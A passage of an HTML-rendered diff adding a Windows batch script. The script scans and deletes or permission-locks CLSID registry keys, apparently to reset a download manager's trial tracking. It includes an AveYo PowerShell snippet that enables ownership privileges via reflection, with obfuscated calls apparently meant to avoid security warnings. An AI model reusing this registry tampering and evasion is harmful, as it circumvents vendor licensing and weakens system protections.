+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=&#34;</span><span class=se>%%</span>~A<span class=s2>&#34;&#34;</span> <span class=p>&amp;</span>reg query <span class=nv>!reg!</span> <span class=nv>%nul%</span> <span class=p>&amp;&amp;</span> <span class=k>call</span> <span class=p>:</span><span class=nl>delete_key</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>add_key</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span> Adding registry key...
+</span></span><span class=line><span class=cl><span class=c1>rem echo:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=&#34;</span><span class=nv>%HKLM%</span><span class=s2>&#34; /v &#34;</span>AdvIntDriverEnabled2<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg add <span class=nv>%reg%</span> /t REG_DWORD /d <span class=s2>&#34;1&#34;</span> /f <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_add_key</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> [<span class=nv>%errorlevel%</span>]<span class=o>==</span>[0] <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=</span><span class=nv>%reg:&#34;=%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>rem echo Added - !reg!</span>
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_error</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=</span><span class=nv>%reg:&#34;=%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>%_psc%</span> write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline<span class=p>&amp;</span><span class=k>echo</span>  - <span class=nv>!reg!</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>action</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=nv>%regdata%</span> <span class=k>del</span> /f /q <span class=nv>%regdata%</span> <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg query <span class=nv>%CLSID%</span> <span class=p>&gt;</span> <span class=nv>%regdata%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>%nul%</span> <span class=nv>%_psc%</span> <span class=s2>&#34;(gc </span><span class=nv>%regdata%</span><span class=s2>) -replace &#39;HKEY_CURRENT_USER&#39;, &#39;HKCU&#39; | Out-File -encoding ASCII </span><span class=nv>%regdata%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=se>%%</span>a <span class=k>in</span> <span class=p>(</span><span class=nv>%regdata%</span><span class=p>)</span> <span class=k>do</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;tokens=</span><span class=nv>%_tok%</span><span class=s2> delims=\&#34;</span> <span class=se>%%</span># <span class=k>in</span> <span class=p>(</span><span class=s2>&#34;</span><span class=se>%%</span><span class=s2>a&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=se>%%</span>#<span class=p>|</span>findstr /r <span class=s2>&#34;{.*-.*-.*-.*-.*}&#34;</span> <span class=p>&gt;</span>nul <span class=p>&amp;&amp;</span> <span class=p>(</span><span class=k>set</span> <span class=s2>&#34;reg=</span><span class=se>%%</span><span class=s2>a&#34;</span> <span class=p>&amp;</span> <span class=k>call</span> <span class=p>:</span><span class=nl>scan_key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=nv>%regdata%</span> <span class=k>del</span> /f /q <span class=nv>%regdata%</span> <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>scan_key</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg query <span class=nv>%reg%</span> <span class=mi>2</span><span class=p>&gt;</span>nul <span class=p>|</span> findstr /i <span class=s2>&#34;LocalServer32 InProcServer32 InProcHandler32&#34;</span> <span class=p>&gt;</span>nul <span class=p>&amp;&amp;</span> <span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg query <span class=nv>%reg%</span> <span class=mi>2</span><span class=p>&gt;</span>nul <span class=p>|</span> find /i <span class=s2>&#34;H&#34;</span> <span class=mi>1</span><span class=p>&gt;</span>nul <span class=p>||</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%_action%</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;skip=2 tokens=*&#34;</span> <span class=se>%%</span>a <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;reg query </span><span class=nv>%reg%</span><span class=s1> /ve 2^&gt;nul&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=k>echo</span> <span class=se>%%</span>a<span class=p>|</span>findstr /r /e <span class=s2>&#34;[^0-9]&#34;</span> <span class=p>&gt;</span>nul <span class=p>||</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%_action%</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;skip=2 tokens=3&#34;</span> <span class=se>%%</span>a <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;reg query </span><span class=nv>%reg%</span><span class=s1>\Version /ve 2^&gt;nul&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=k>echo</span> <span class=se>%%</span>a<span class=p>|</span>findstr /r <span class=s2>&#34;[^0-9]&#34;</span> <span class=p>&gt;</span>nul <span class=p>||</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%_action%</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;skip=2 tokens=1&#34;</span> <span class=se>%%</span>a <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;reg query </span><span class=nv>%reg%</span><span class=s1> 2^&gt;nul&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=k>echo</span> <span class=se>%%</span>a<span class=p>|</span> findstr /i <span class=s2>&#34;MData Model scansk Therad&#34;</span> <span class=p>&gt;</span>nul <span class=p>&amp;&amp;</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%_action%</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;skip=2 tokens=*&#34;</span> <span class=se>%%</span>a <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;reg query </span><span class=nv>%reg%</span><span class=s1> /ve 2^&gt;nul&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=k>echo</span> <span class=se>%%</span>a<span class=p>|</span> find /i <span class=s2>&#34;+&#34;</span> <span class=p>&gt;</span>nul <span class=p>&amp;&amp;</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%_action%</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>exit</span>/b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>delete_key</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg delete <span class=nv>%reg%</span> /f <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> [<span class=nv>%errorlevel%</span>]<span class=o>==</span>[0] <span class=k>if</span> <span class=k>defined</span> <span class=nv>take_permission</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%nul%</span> call :reg_own <span class=s2>&#34;</span><span class=nv>%reg%</span><span class=s2>&#34;</span> preserve S-1-1-0
+</span></span><span class=line><span class=cl>reg delete <span class=nv>%reg%</span> /f <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> [<span class=nv>%errorlevel%</span>]<span class=o>==</span>[0] <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=</span><span class=nv>%reg:&#34;=%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>rem echo Deleted - !reg!</span>
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=</span><span class=nv>%reg:&#34;=%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_error</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl><span class=nv>%_psc%</span> write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline <span class=p>&amp;</span> <span class=k>echo</span>  - <span class=nv>!reg!</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>lock_key</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>%nul%</span> call :reg_own <span class=s2>&#34;</span><span class=nv>%reg%</span><span class=s2>&#34;</span> <span class=s2>&#34;&#34;</span> S-1-1-0 S-1-0-0 Deny <span class=s2>&#34;FullControl&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg delete <span class=nv>%reg%</span> /f <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> [<span class=nv>%errorlevel%</span>]<span class=o>==</span>[0] <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=</span><span class=nv>%reg:&#34;=%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>rem echo Locked - !reg!</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=k>/a</span> <span class=nv>lockedkeys</span><span class=o>+=</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_error</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=</span><span class=nv>%reg:&#34;=%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>%_psc%</span> write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline<span class=p>&amp;</span><span class=k>echo</span>  - <span class=nv>!reg!</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>count_key</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=k>/a</span> <span class=nv>foundkeys</span><span class=o>+=</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:  A lean and mean snippet to set registry ownership and permission recursively</span>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:  Written by @AveYo aka @BAU</span>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:  pastebin.com/XTPt0JSC</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>reg_own</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>%_psc%</span> $A=&#39;<span class=nv>%~1</span>&#39;,&#39;<span class=nv>%~2</span>&#39;,&#39;<span class=nv>%~3</span>&#39;,&#39;<span class=nv>%~4</span>&#39;,&#39;<span class=nv>%~5</span>&#39;,&#39;<span class=nv>%~6</span>&#39;;iex(([io.file]::ReadAllText(&#39;!_batp!&#39;)-split&#39;:Own1\:.*&#39;)[1])<span class=p>&amp;</span><span class=k>exit</span>/b:Own1:
+</span></span><span class=line><span class=cl>$D1=[uri].module.gettype(&#39;System.Diagnostics.Process&#39;).<span class=s2>&#34;GetM`ethods&#34;</span>(42) <span class=p>|</span>where {$_.Name -eq &#39;SetPrivilege&#39;} #`:no-ev-warn
+</span></span><span class=line><span class=cl>&#39;SeSecurityPrivilege&#39;,&#39;SeTakeOwnershipPrivilege&#39;,&#39;SeBackupPrivilege&#39;,&#39;SeRestorePrivilege&#39;<span class=p>|</span>foreach {$D1.Invoke($null, @(<span class=s2>&#34;$_&#34;</span>,2))}
+</span></span><span class=line><span class=cl>$path=$A[0]; $rk=$path-split&#39;\\&#39;,2; $HK=gi -lit Registry::$($rk[0]) -fo; $s=$A[1]; $sps=[Security.Principal.SecurityIdentifier]
+</span></span><span class=line><span class=cl>$u=($A[2],&#39;S-1-5-32-544&#39;)[!$A[2]];$o=($A[3],$u)[!$A[3]];$w=$u,$o <span class=p>|</span>% {new-object $sps($_)}; $old=<span class=nv>!$A[3];$own=!</span>$old; $y=$s-eq&#39;all&#39;
+</span></span><span class=line><span class=cl>$rar=new-object Security.AccessControl.RegistryAccessRule( $w[0], ($A[5],&#39;FullControl&#39;)[!$A[5]], 1, 0, ($A[4],&#39;Allow&#39;)[!$A[4]] )
+</span></span><span class=line><span class=cl>$x=$s-eq&#39;none&#39;;function Own1($k){$t=$HK.OpenSubKey($k,2,&#39;TakeOwnership&#39;);if($t){0,4<span class=p>|</span>%{try{$o=$t.GetAccessControl($_)}catch{$old=0}
+</span></span><span class=line><span class=cl>};if($old){$own=1;$w[1]=$o.GetOwner($sps)};$o.SetOwner($w[0]);$t.SetAccessControl($o); $c=$HK.OpenSubKey($k,2,&#39;ChangePermissions&#39;)
+</span></span><span class=line><span class=cl>$p=$c.GetAccessControl(2);if($y){$p.SetAccessRuleProtection(1,1)};$p.ResetAccessRule($rar);if($x){$p.RemoveAccessRuleAll($rar)}
+</span></span><span class=line><span class=cl>$c.SetAccessControl($p);if($own){$o.SetOwner($w[1]);$t.SetAccessControl($o)};if($s){$subkeys=$HK.OpenSubKey($k).GetSubKeyNames()
+</span></span><span class=line><span class=cl>foreach($n in $subkeys){Own1 <span class=s2>&#34;$k\$n&#34;</span>}}}};Own1 $rk[1];if($env:VO){get-acl Registry::$path<span class=p>|</span>fl} #:Own1: lean <span class=p>&amp;</span> mean snippet by AveYo
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_color</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%winbuild%</span> <span class=ow>GEQ</span> 10586 <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>%esc%</span>[<span class=nv>%~1%~2%esc%</span>[0m
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>batcol</span> <span class=nv>%~1</span> <span class=s2>&#34;</span><span class=nv>%~2</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_color2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%winbuild%</span> <span class=ow>GEQ</span> 10586 <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>%esc%</span>[<span class=nv>%~1%~2%esc%</span>[<span class=nv>%~3%~4%esc%</span>[0m
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>batcol</span> <span class=nv>%~1</span> <span class=s2>&#34;</span><span class=nv>%~2</span><span class=s2>&#34;</span> <span class=nv>%~3</span> <span class=s2>&#34;</span><span class=nv>%~4</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:=======================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Colored text with pure batch method</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Powershell is not used here because its slow</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>batcol</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>pushd</span> <span class=nv>%_coltemp%</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>exist</span> <span class=s2>&#34;&#39;&#34;</span> <span class=p>(&lt;</span>nul <span class=p>&gt;</span><span class=s2>&#34;&#39;&#34;</span> <span class=k>set</span> <span class=k>/p</span> <span class=s2>&#34;=.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>setlocal</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;s=</span><span class=nv>%~2</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;t=</span><span class=nv>%~4</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_batcol</span> <span class=nv>%1</span> s <span class=nv>%3</span> t
+</span></span><span class=line><span class=cl><span class=k>del</span> /f /q <span class=s2>&#34;&#39;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>del</span> /f /q <span class=s2>&#34;`.txt&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>popd</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_batcol</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>setlocal</span> EnableDelayedExpansion
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;s=!</span><span class=nv>%~2</span><span class=s2>!&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;t=!</span><span class=nv>%~4</span><span class=s2>!&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> delims<span class=se>^=^ </span>eol<span class=se>^=</span> <span class=se>%%</span>i <span class=k>in</span> <span class=p>(</span><span class=s2>&#34;</span><span class=nv>!s!</span><span class=s2>&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=s2>&#34;!&#34;</span> <span class=ow>equ</span> <span class=s2>&#34;&#34;</span> <span class=k>setlocal</span> DisableDelayedExpansion
+</span></span><span class=line><span class=cl>    <span class=p>&gt;</span>`.txt <span class=p>(</span><span class=k>echo</span> <span class=se>%%</span>i\..\&#39;<span class=p>)</span>
+</span></span><span class=line><span class=cl>    findstr /a:<span class=nv>%~1</span> /f:`.txt <span class=s2>&#34;.&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span>nul <span class=k>set</span> <span class=k>/p</span> <span class=s2>&#34;=</span><span class=nv>%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s2>&#34;</span><span class=nv>%~4</span><span class=s2>&#34;</span><span class=o>==</span><span class=s2>&#34;&#34;</span> <span class=k>echo</span>(<span class=p>&amp;</span><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=k>setlocal</span> EnableDelayedExpansion
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> delims<span class=se>^=^ </span>eol<span class=se>^=</span> <span class=se>%%</span>i <span class=k>in</span> <span class=p>(</span><span class=s2>&#34;</span><span class=nv>!t!</span><span class=s2>&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=s2>&#34;!&#34;</span> <span class=ow>equ</span> <span class=s2>&#34;&#34;</span> <span class=k>setlocal</span> DisableDelayedExpansion
+</span></span><span class=line><span class=cl>    <span class=p>&gt;</span>`.txt <span class=p>(</span><span class=k>echo</span> <span class=se>%%</span>i\..\&#39;<span class=p>)</span>
+</span></span><span class=line><span class=cl>    findstr /a:<span class=nv>%~3</span> /f:`.txt <span class=s2>&#34;.&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span>nul <span class=k>set</span> <span class=k>/p</span> <span class=s2>&#34;=</span><span class=nv>%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>(
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:=======================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_colorprep</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%winbuild%</span> <span class=ow>GEQ</span> 10586 <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/F</span> <span class=se>%%</span>a <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;echo prompt $E ^| cmd&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=k>set</span> <span class=s2>&#34;esc=</span><span class=se>%%</span><span class=s2>a&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span>     <span class=s2>&#34;Red=&#34;</span>41;97m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>    <span class=s2>&#34;Gray=&#34;</span>100;97m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>   <span class=s2>&#34;Black=&#34;</span>30m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>   <span class=s2>&#34;Green=&#34;</span>42;97m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>    <span class=s2>&#34;Blue=&#34;</span>44;97m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>  <span class=s2>&#34;Yellow=&#34;</span>43;97m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;Magenta=&#34;</span>45;97m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span>    <span class=s2>&#34;_Red=&#34;</span>40;91m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>  <span class=s2>&#34;_Green=&#34;</span>40;92m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>   <span class=s2>&#34;_Blue=&#34;</span>40;94m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>  <span class=s2>&#34;_White=&#34;</span>40;37m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_Yellow=&#34;</span>40;93m<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>defined</span> <span class=nv>_BS</span> <span class=k>for</span> <span class=k>/f</span> <span class=se>%%</span>A <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;&#34;prompt $H&amp;for </span><span class=se>%%</span><span class=s1>B in (1) do rem&#34;&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=k>set</span> <span class=s2>&#34;_BS=</span><span class=se>%%</span><span class=s2>A </span><span class=se>%%</span><span class=s2>A&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_coltemp=</span><span class=nv>%SystemRoot%</span><span class=s2>\Temp&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span>     <span class=s2>&#34;Red=&#34;</span>CF<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>    <span class=s2>&#34;Gray=&#34;</span>8F<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>   <span class=s2>&#34;Black=&#34;</span>00<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>   <span class=s2>&#34;Green=&#34;</span>2F<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>    <span class=s2>&#34;Blue=&#34;</span>1F<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>  <span class=s2>&#34;Yellow=&#34;</span>6F<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;Magenta=&#34;</span>5F<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span>    <span class=s2>&#34;_Red=&#34;</span>0C<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>  <span class=s2>&#34;_Green=&#34;</span>0A<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>   <span class=s2>&#34;_Blue=&#34;</span>09<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span>  <span class=s2>&#34;_White=&#34;</span>07<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_Yellow=&#34;</span>0E<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>txt</span><span class=c1>:</span>
